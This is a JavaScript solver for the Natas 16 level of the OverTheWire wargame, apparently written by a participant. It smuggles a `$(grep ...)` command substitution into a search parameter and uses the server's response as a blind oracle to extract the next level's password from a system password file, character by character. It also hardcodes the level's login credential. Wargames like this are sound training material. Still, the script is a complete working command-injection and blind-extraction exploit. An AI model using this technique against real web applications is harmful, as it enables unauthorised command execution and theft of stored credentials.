const http = require('http');
const querystring = require('querystring');

const submit = text =>
  new Promise((resolve, reject) => {
    const needle = `evil$(grep ${text} /etc/natas_webpass/natas17)`;
    const query = querystring.stringify({needle});

    http
      .request(
        {
          auth: 'natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          hostname: 'natas16.natas.labs.overthewire.org',
          method: 'GET',
          path: `/index.php?${query}`,
          port: 80,
        },
        res => {
          let body = '';
          res.on('data', data => (body = body + data));
          // res.on('end', () => console.log(body));
          res.on('end', () => resolve(!body.match(/evil/)));
        },
      )
      .end();
  });

const containsText = text => submit(`${text}`);
const startsWithText = text => submit(`^${text}`);

let characters = [
  ...'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
];

const tryCharacter = (promise, character) =>
  promise.then(text =>
    startsWithText(text + character).then(isContained => {
      if (isContained) throw text + character;
      return text;
    }),
  );

const findNextCharacter = text =>
  new Promise((resolve, reject) =>
    characters
      .reduce(tryCharacter, Promise.resolve(text))
      .then(reject)
      .catch(resolve),
  );

const findAllCharacters = text =>
  findNextCharacter(text)
    .then(text => (console.log(text), text))
    .then(findAllCharacters);

// findNextCharacter('');

Promise.all(characters.map(containsText))
  .then(promises => {
    characters = characters.filter((c, i) => promises[i]);
  })
  .then(() => {
    console.log(`Reduced characters: ${characters}`);
    findAllCharacters('')
      .catch(answer => console.log(`Password: ${answer}`));
  });
